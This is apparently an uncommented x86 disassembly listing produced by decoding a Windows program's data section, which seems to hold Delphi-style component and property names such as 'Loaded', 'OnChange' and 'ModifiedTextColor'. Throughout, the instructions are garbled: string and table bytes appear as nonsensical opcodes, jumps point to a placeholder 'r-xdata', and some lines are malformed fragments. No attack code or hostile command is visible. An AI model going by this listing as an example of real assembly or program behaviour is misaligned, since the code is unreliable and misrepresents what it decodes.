imul ebp [ ebp + 0x6e ] 0x2656d61
add [ edx ] al
add [ esi ] bh
add [ eax + 0xe004499 ] al
popad
insb
jae r-xdata
inc esp
add [ edx ] cl
sbb eax [ eax ]
add [ eax ] eax
std
xchg edi eax
outsb
je r-xdata
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
inc eax
jb r-xdata
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4505ffff ] al
insd
jo r-xdata
imul esp [ ebx - 0x14 ] 0x70004493
bound eax [ edx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
push es
inc ecx
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x9c000002
adc [ eax ] al
add al [ eax ]
pop es
inc ecx
dec eax
imul esp [ gs : edi + 0x68 ] 0x2000274
add [ eax + r-xdata ] dl
pop es
popad
je r-xdata
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add al [ eax ]
nop
mov al [ 0x7004497 ]
popad
je r-xdata
insb
add al [ eax ]
add ah cl
adc [ eax ] al
add [ eax ] eax
pop es
inc ecx
inc esi
outsd
jb r-xdata
add [ eax ] al
or al 0x0
add al 0x0
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
adc [ eax ] al
add al [ eax ]
add eax 0x74614441
popad
add al [ eax ]
add [ eax + 0x80040af ] eax
add [ eax ] cl
inc ecx
push eax
popad
insb
je r-xdata
popad
je r-xdata
add [ eax ] al
int3
push esp
outsd
push ebx
je r-xdata
jb r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ edi + edx * 4 + 0x44 ] bl
add al 0x53
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ ebx ] al
dec edi
bound ebp [ edx + 0x2 ]
add [ edx ] al
add [ esi ] bh
add [ eax ] al
test [ eax + eax + 0xc ] 0x64616f4c
inc esi
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add al [ eax ]
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] dl
inc eax
add [ edx ] ah
add [ eax ] al
add [ eax ] dl
inc esi
push eax
popad
insb
je r-xdata
add [ eax ] al
dec esi
jae r-xdata
push es
adc al [ eax ]
add ecx [ ebp + 0x73 ]
add al [ bx + si ]
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500fffff ] al
popad
insb
je r-xdata
jns r-xdata
inc [ 0x74706d45 ]
imul esp [ ebx + 0x73 ] 0xa0000
add cl [ ecx ]
cwde
inc esp
add [ edx ] al
add [ edx ] al
sub [ eax + 0x20044 ] ebx
add cl [ edx - 0x68 ]
add al 0x0
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
adc [ eax ] al
add [ eax ] eax
pop es
inc ecx
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
clc
add [ ecx ] al
inc esp
add [ edx ] al
add [ edx ] al
insd
cwde
inc esp
add [ edx ] al
add [ edx ] al
or [ eax + 0x20044 ] ebx
add al [ gs : eax ]
add al [ eax ]
dec eax
add ah bh
test [ eax + eax + 0x7 ] 0x53746553
clc
add [ eax ] al
adc [ eax ] al
add al [ eax ]
add eax 0x74614441
popad
add al [ eax ]
add [ eax + 0x80040af ] al
add [ eax ] cl
inc ecx
push eax
popad
insb
je r-xdata
add al bh
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor eax [ eax ]
shl dh 0x44
add [ esi ] al
inc ebp
jno r-xdata
add eax [ gs : eax ]
add [ 0x4495cd00 ] dl
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x26465
add [ eax ] al
or [ eax ] eax
xchg ebp eax
inc esp
add [ eax + eax + 0x14 ] cl
add [ ebp + edx * 4 + 0x44 ] bl
add [ edx ] cl
cmc
dec [ edi + 0x4a004495 ]
test al 0x40
add [ ecx ] al
push edx
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ebx ] al
dec ebp
jae r-xdata
add ah ah
xchg ecx eax
inc esp
add [ eax + edx + 0x10000040 ] dh
inc eax
add ah cl
test al 0x40
outsb
add [ bx + si ] al
sbb al 0x40
add [ eax ] al
adc [ eax ] al
int3
inc ebp
jbe r-xdata
inc esp
add [ eax ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x10006465
inc eax
add [ eax + eax ] ch
add dh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540bffff ] al
jb r-xdata
add ch [ ecx ]
cwde
inc esp
add [ edx ] al
add [ edx ] al
dec edx
cwde
add al [ eax ]
adc [ eax ] al
and al 0x0
add dh bh
cmp [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
je r-xdata
add al [ gs : eax ]
add al [ eax ]
add [ bx + si + 0x4499 ] bl
add [ 0x65766153 ] dl
push esp
outsd
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
cwde
cdq
inc esp
dec esp
outsd
popad
popad
insd
add al [ eax ]
add al [ eax ]
imul eax [ eax ] r-xdata
pop ss
inc esp
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
xchg ebx eax
inc esp
add [ ebx + edx * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5c004497 ] ah
xchg esp eax
inc esp
add cl bl
xchg esp eax
inc esp
add [ 0x2d004495 ] ah
xchg ebp eax
inc esp
add [ eax + eax ] ch
add [ eax ] al
xor [ ecx + 0x42 ] ah
add al al
test [ eax + eax - 0x4c ] 0x56
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ esp + edx + 0x43 ] al
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
adc eax [ ebx ]
sbb ch dh
inc esp
add ah cl
adc al [ ebx ]
aam 0x14
inc ebx
add [ eax + 0x680044f4 ] ch
inc esi
inc eax
add [ ebp + esi * 8 + 0x44 ] ch
add [ eax + 0x680044f5 ] al
inc esi
inc eax
add [ eax + 0x46 ] ch
inc eax
add al dh
test [ eax + eax - 0x8 ] 0xf6
inc esp
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x680044f7 ] al
inc esi
inc eax
add ah ah
test [ eax + eax + 0x18 ] 0x680044f8
inc esi
inc eax
add [ eax ] ch
clc
inc esp
add ah dh
test [ eax + eax + 0x70 ] 0xf4
inc esp
add [ eax ] al
test [ eax + eax - 0x74 ] 0x680044f7
inc esi
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add ah bh
test [ eax + eax ] 0x0
add [ 0x46d40000 ] al
inc edx
add [ eax ] dl
add [ eax ] al
add [ ecx ] cl
inc esi
dec edi
outsb
inc ebx
push 0x65676e61
add al [ eax ]
add [ eax ] dh
xchg edx eax
inc esp
add [ eax ] bl
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
push eax
jb r-xdata
dec edi
pushad
mov dl 0xdd
pushad
xchg ebx eax
nop
int3
add al [ eax ]
add [ eax + eax * 2 ] bl
outsb
je r-xdata
0x99fc0044 0x44
sbb [ edx + 0x44 ] ebx
add [ eax ] al
jb r-xdata
add [ eax + 0x4f0affff ] al
outsb
push eax
jb r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul edi [ edx + 0x65 ] 0x3
add [ eax ] al
or [ eax ] al
add eax [ eax ]
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
add [ edx ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ebx - 0x651bffbc ]
inc esp
add [ edx + 0x449b ] dl
add [ eax ] al
add [ esi + 0x7800449b ] bl
add [ eax ] al
add [ eax - 0x53ffbb67 ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jae r-xdata
add [ eax + eax ] cl
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x531bffff ] al
jne r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
add [ ecx ] al
add [ edx ] dh
r--data 0xffff
or al 0x54
add [ eax ] al
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
inc esp
add [ eax ] dl
inc eax
pop eax
inc eax
pop eax
jo r-xdata
outsb
je r-xdata
adc al [ eax ]
xchg ebp eax
add [ eax ] al
add [ edx ] al
push cs
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x3ffbb03 ] bl
cdq
inc esp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
jb r-xdata
inc eax
add [ eax - 0x2fffbfa8 ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5007ffff ] al
popad
insb
je r-xdata
adc [ eax ] al
xor [ eax ] al
add dh bh
inc esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705ffff ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
adc [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
add [ eax ] al
mov al [ 0xffffffffac004499 ]
jns r-xdata
jae r-xdata
add [ eax ] dl
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
outsb
inc ebx
push 0x65676e61
xor [ edx + 0x180044 ] dl
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add [ eax ] al
jmp [ edx ]
add [ eax ] al
or [ eax ] al
add [ eax ] eax
pop esp
0x44 0x5304
insb
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
pushad
0xc070044 0x5354
push 0x64657261
dec ecx
insd
popad
clc
cdq
inc esp
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edx + ebx * 4 + 0x44 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ 0xc00449a ] ah
popad
jb r-xdata
std
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
hlt
std
inc esp
add ah bh
jo r-xdata
inc eax
add al bl
pop eax
inc eax
imul esp [ ecx + 0x6c ] 0x6e617254
jae r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add ah dh
scasb [ edi ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ edi ] al
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add ah dh
scasb [ edi ]
inc eax
add [ eax + eax ] cl
add [ eax ] al
or eax [ esi + 0x4d ]
popad
jae r-xdata
imul esp [ ebx + 0x73 ] 0x0
add al [ eax ]
nop
loopne r-xdata
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x3 ] dl
inc esp
add [ eax + 0x46 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
or [ esi + 0x52 ] eax
inc bx
outsd
jne r-xdata
popad
jb r-xdata
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
jno r-xdata
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax + 0x100040af ] al
add [ eax ] al
add [ eax ] cl
inc esi
push eax
popad
insb
je r-xdata
push ebx
push 0x64657261
dec ecx
insd
popad
daa
add [ eax - 0x3 ] dl
inc esp
add [ edi ] al
inc esp
jae r-xdata
dec [ esp + edx * 2 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
fwait
inc esp
add ah ah
0x9b920044 0x44
add [ eax ] al
add [ eax ] al
sahf
fwait
inc esp
add [ eax ] bh
add ah dl
pop eax
outsb
arpl [ ecx - 0x73 ] di
inc eax
add cl ch
jecxz r-xdata
add [ eax ] al
or al [ esi + 0x4f ]
add bh bh
dec [ esp + edx * 2 ]
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
daa
add [ eax + 0x70044fd ] bl
inc esp
jae r-xdata
add al [ gs : eax ]
add ah dh
scasb [ edi ]
inc eax
add [ eax + eax ] dl
add [ eax ] al
or al [ esi + 0x44 ]
dec ecx
inc edx
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax ] cl
mov bh 0x40
add [ eax ] bl
add [ eax ] al
add [ esi + eax * 2 ] al
inc esp
dec ecx
inc edx
add al [ eax ]
add [ edi + ecx * 4 ] dl
inc edx
add [ eax + eax ] ch
add [ ebx ] cl
inc esi
push ebx
popad
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
and eax 0xc00449a
sti
dec [ ebp - 0x2416ffc0 ]
lodsb [ esi ]
sti
dec [ ebp - 0x2c16ffc0 ]
lodsb [ esi ]
sti
dec [ ebp - 0x3416ffc0 ]
lodsb [ esi ]
sti
dec [ ebp - 0x6607ffc0 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x66 ] ah
inc esp
add ah bh
cdq
inc esp
add [ ecx ] bl
0x44 0x0
add [ eax ] al
popad
je r-xdata
add eax 0x44446d62
inc edx
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
fwait
push ebx
je r-xdata
je r-xdata
popad
jo r-xdata
add [ ecx ] al
add [ ebx + 0x4d00449b ] ch
add [ eax ] al
jae r-xdata
imul esp [ ebx + 0x73 ] 0x40900002
pushfd
inc esp
add [ ebx ] al
or al 0x54
push eax
imul edi [ eax + 0x65 ] 0x726f466c
insd
popad
je r-xdata
inc esp
dec ecx
jns r-xdata
push ebx
xor al [ esi + 0x6f ]
jb r-xdata
add [ eax ] al
add [ edx ] cl
inc esi
dec edi
inc esp
add [ edx + ebx * 4 + 0x44 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
fcomp [ ebx + 0xc070044 ]
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
loopne r-xdata
popad
insd
add al [ eax ]
add [ eax ] al
adc [ eax ] al
jo r-xdata
pop es
jo r-xdata
add [ esp + ebx * 4 ] bh
popad
outsb
insb
push esp
jns r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
popfd
inc esp
add [ esi ] al
outsd
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc esp
add [ eax ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
add [ eax ] al
or [ eax ] al
add [ eax ] eax
aam 0x9b
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add ah dl
add [ eax ] al
cmp al 0x9c
jo r-xdata
add [ eax ] al
or [ esi + 0x48 ] eax
popad
insb
je r-xdata
jne r-xdata
xor [ esi ] esi
punpcklwd mm4 [ fs : esi + 0x50 ]
jo r-xdata
xor [ 0x7746962 ] esi
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x900449c ] dh
inc esp
jbe r-xdata
bound ebp [ ecx + 0x74 ]
pop es
jo r-xdata
inc edx
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
pushfd
inc esp
add [ 0x49446d62 ] al
add [ eax - 0x63ffbaf8 ] bl
adc eax [ ebx ]
sbb ch dh
inc ecx
jne r-xdata
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x408d0002
add [ esp + ebx * 4 + 0xc030044 ] dh
push esp
inc ecx
insb
jo r-xdata
add al [ eax ]
nop
add al 0x9c
inc esp
add [ ebx ] al
adc [ edx + eax * 2 + 0x69 ] edx
je r-xdata
imul esp [ ebx + 0x73 ] 0x0
0x9a5c0044 0x44
add [ eax ] al
or [ edi + 0x72 ] al
popad
outsb
fcomp [ esi + 0x44 ]
je r-xdata
or [ fs : edi + 0x72 ] al
popad
xor dh [ edx ]
imul esi [ edi + eax + 0x70 ] 0x62323366
imul esi [ eax + ecx + 0x70 ] 0x73754366
je r-xdata
add [ eax ] al
jl r-xdata
insd
add [ ebx + edx * 4 - 0x93fffbc ] dl
inc esp
add [ esi + edx * 2 + 0x58b80040 ] dh
lea eax [ eax ]
cwde
popfd
inc esp
add [ eax ] al
jb r-xdata
or [ fs : ecx + 0x66 ] esp
inc esp
popad
dec cx
outsb
mov al 0x9c
arpl [ ebp + 0x6 ] sp
jo r-xdata
add [ eax ] al
push es
inc esi
dec ecx
insd
popad
add al [ gs : bx + si ]
add al bh
nop
inc esp
add [ eax + eax ] ch
add [ eax ] al
pop es
inc esi
inc ebx
popad
outsb
jbe r-xdata
inc ebp
add [ eax + ebx ] dl
inc ebp
add [ ecx + ebp + 0x2a240045 ] al
inc ebp
add [ ecx + edx + 0x12000045 ] cl
inc ebp
add [ eax + 0x4521 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
aam 0x9b
inc esp
add [ eax ] ch
add [ eax ] al
add [ esi ] al
inc esp
add ah dl
or [ ebp ] al
aam 0x14
inc ebx
cmc
outsd
pop es
je r-xdata
push 0x4400449f
add [ eax ] al
outsd
je r-xdata
push es
popad
inc esi
outsd
jb r-xdata
add ah bl
sahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax - 0x61 ] ch
jo r-xdata
inc esp
add [ eax + eax ] al
lahf
imul esp [ ebx + 0x73 ] 0xc08b0002
add al 0x9d
inc esp
add [ ebx ] al
adc [ esp + edx * 2 + 0x72 ] dl
popad
outsb
jae r-xdata
insd
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
add [ esi + ebx * 4 ] dl
inc esp
inc esp
inc esp
add [ ecx ] cl
xor [ edx + 0x69 ] esp
je r-xdata
outsb
je r-xdata
jae r-xdata
inc ebx
add [ eax ] bl
inc esi
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
imul esp [ ebp + 0x64 ] 0x61724708
adc al 0x43
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
popad
jb r-xdata
push es
jo r-xdata
jo r-xdata
add [ eax + eax ] dl
xchg esi eax
lahf
inc esp
add [ ebp ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
add [ esi ] cl
inc esi
dec ecx
outsb
outsd
jb r-xdata
add [ eax ] al
add ah dl
or al [ ebp ]
pop esp
or eax [ ebp ]
or [ esi ] cl
inc ebp
add [ eax + 0x280044f5 ] al
adc [ ebp ] eax
[ ebp ] eax
xor [ edx ] dl
inc ebp
add al bh
test [ eax + eax - 0x14 ] 0x14
inc ebp
add [ edx + ebx + 0x22c40045 ] bl
inc ebp
add [ ebx + 0x45 ] ah
add [ eax ] bl
clc
inc esp
add [ esi ] bl
inc ebp
add [ esi ] ch
inc ebp
add al cl
adc al [ ebp ]
and al 0x8
inc ebp
add [ eax ] al
test [ eax + eax - 0x74 ] 0x780044f7
sbb [ ebp ] eax
jl r-xdata
aam 0x8
inc ebp
add ah dl
adc al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x44 ] bh
imul esp [ ebx + 0x73 ] 0x408d0002
add [ eax + 0x449d ] bl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
inc eax
add [ eax + 0x44004058 ] dh
pop eax
imul bp [ gs : esi + 0x65 ] 0xf64
popad
push ax
inc sp
cmp [ edx + 0x69 ] ah
outsd
jb r-xdata
outsb
xor al 0x62
imul esi [ esi + eax + 0x70 ] 0x69623866
add [ ebp + 0x380044 ] bl
add [ eax ] al
adc [ esi + 0x54 ] al
jb r-xdata
add [ eax ] al
jae r-xdata
push eax
popad
insb
je r-xdata
add bl bl
mov al [ r-xdata ]
pop ss
add [ ecx ] bl
outsb
mov eax [ r-xdata ]
hlt
popad
jb r-xdata
add [ esi + eax * 2 ] cl
inc ecx
insb
jo r-xdata
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
xor [ eax ] eax
add [ eax ] al
push cs
inc esi
dec ebp
popad
jae r-xdata
mov eax [ r-xdata ]
hlt
outsb
je r-xdata
add [ edx ] al
hlt
popad
inc esi
outsd
jb r-xdata
inc edx
imul esi [ ebx + esi * 2 + 0x56 ] 0x64696c61
add al [ eax ]
add [ eax ] al
adc [ eax ] al
xor al [ eax ]
add [ eax ] al
or al [ esi + 0x4d ]
popad
jae r-xdata
inc edx
add ah dh
push [ edx - 0x60 ]
inc esp
add [ edx ] cl
sbb [ eax ] eax
outsd
add al [ gs : eax ]
add [ eax + 0x3900449c ] dh
add [ eax ] al
add [ edx ] bl
add [ eax - 0x5e ] cl
inc esp
add [ edx ] cl
sbb [ eax ] al
test [ edx + r-xdata ] ah
sbb eax [ eax ]
int3
popad
je r-xdata
push esi
popad
insb
imul esp [ edx + eax ] 0x44675800
add [ eax + eax ] dh
add [ eax ] al
adc [ esi + 0x54 ] eax
jb r-xdata
add [ ecx ] dl
add [ eax - 0x61 ] dh
inc esp
add [ eax + eax + 0x14 ] cl
add [ esi + 0x4d00449f ] dl
add bh bh
add [ eax ] al
inc esp
add [ edx ] al
hlt
outsb
jae r-xdata
popad
jb r-xdata
inc edx
add ah dh
inc [ ebx - 0x60 ]
inc esp
add [ edx ] al
hlt
sub_44ab8c
in al 0xab
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x52 ] ah
inc esp
add al ch
stosd [ edi ]
inc esp
add [ ebx ] ch
lodsb [ esi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ edi - 0x54 ] ch
inc esp
add [ eax ] ch
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edi + ebp * 4 - 0x4defffbc ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ edx ] al
dec esp
insd
inc esp
add [ eax + eax ] al
add [ eax ] al
pop es
push edx
jae r-xdata
add [ edx ] al
hlt
imul esi [ ebx + 0x74 ] 0x28020002
scasb [ edi ]
inc eax
add [ eax ] cl
add [ eax ] al
add [ 0x636f4c46 ] al
imul eax [ edx ] 0x0
add cl ah
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or edx [ edx + 0x65 ]
jae r-xdata
push [ ebx ]
scasb [ edi ]
inc esp
add [ edx ] al
hlt
popad
je r-xdata
push es
inc ebx
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] 0x2
or [ eax ] al
sub [ esp + eax * 2 - 0xbffbc00 ] 0xff
mov esp 0x4d0044ac
add bh bh
jmp ebx
push edx
jae r-xdata
popad
je r-xdata
mov cl 0x44
add [ esi ] cl
inc ebx
jne r-xdata
outsd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
pop esp
scasb [ edi ]
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
adc [ eax ] al
add al [ eax ]
or al 0x41
push edx
jae r-xdata
add al [ eax ]
add [ eax ] cl
jne r-xdata
push 0x65676e61
push edx
jae r-xdata
arpl [ ebp + 0x3 ] sp
add [ ebp + ebp * 2 + 0x44 ] cl
add [ eax ] cl
add [ edx ] al
add [ esi + ebp * 4 + 0x44 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ edi ] al
popad
je r-xdata
add [ eax ] al
add al 0x53
jo r-xdata
outsd
inc esp
add [ ecx ] al
add [ esi ] cl
inc edi
jb r-xdata
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ esi + ebp * 4 + 0x44 ] bl
add [ edi ] dl
mov [ ecx + 0x430e0044 ] dh
popad
je r-xdata
push edx
jae r-xdata
pop es
push ebx
imul edi [ edx + 0x65 ] 0x20002
daa
add [ edi + ebp * 4 + 0x44070044 ] al
jae r-xdata
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edi + ebp * 4 - 0x4d6fffbc ] al
inc esp
add [ 0x75724254 ] dl
jne r-xdata
add al [ eax ]
lea eax [ eax ]
pushad
scasb [ edi ]
inc esp
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
je r-xdata
jo r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] cl
outsd
inc esp
add [ ecx ] al
add [ esi ] cl
pop esp
scasb [ edi ]
inc esp
add al [ eax ]
add al [ eax ]
add [ eax + 0xc0044b0 ] bh
inc esi
jb r-xdata
add [ edx ] al
add [ esi + ebp * 4 + 0x44 ] bl
jb r-xdata
fimul [ ebx + 0x4e8966f0 ]
and [ ebp - 0x17aff7ba ] cl
in eax 0xc
cld
dec [ ebx + 0x74db84c6 ]
psubsb mm6 mm2
stosd [ edi ]
sti
jmp [ edi + ecx * 4 + 0x5 ]
push edx
jae r-xdata
add [ ebp + edx * 2 - 0x507bffc0 ] ah
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
add [ eax + eax * 2 ] bl
jne r-xdata
add [ edx ] al
dec esp
insd
inc esp
add [ eax ] al
add [ ecx ] cl
inc ecx
push edx
jae r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
inc edi
jb r-xdata
add [ eax ] eax
push cs
push edx
jae r-xdata
outsd
jne r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebp + ebp * 2 + 0x44 ] cl
add [ ecx ] al
add [ eax ] cl
push edx
jae r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
pop esp
scasb [ edi ]
inc esp
jns r-xdata
call InitializeCriticalSection
jne r-xdata
jae r-xdata
add [ eax ] al
stosd [ edi ]
inc esp
add [ eax ] al
sbb al 0x40
inc esp
add [ eax + 0x150044b2 ] dl
push esp
scasd [ edi ]
jo r-xdata
add [ eax ] cl
inc edi
jb r-xdata
insb
add al [ eax ]
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ eax + eax ] ah
test al 0xaf
arpl [ edx + eax ] si
add [ ebp + ebp * 2 + 0x44 ] cl
bound ebp [ edx + 0x65 ]
popad
je r-xdata
arpl [ edx + eax ] si
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ edi ] al
jne r-xdata
outsb
insb
outsd
arpl [ ebx + 0x3 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esi + ebp * 4 + 0x44 ] bl
add [ eax ] al
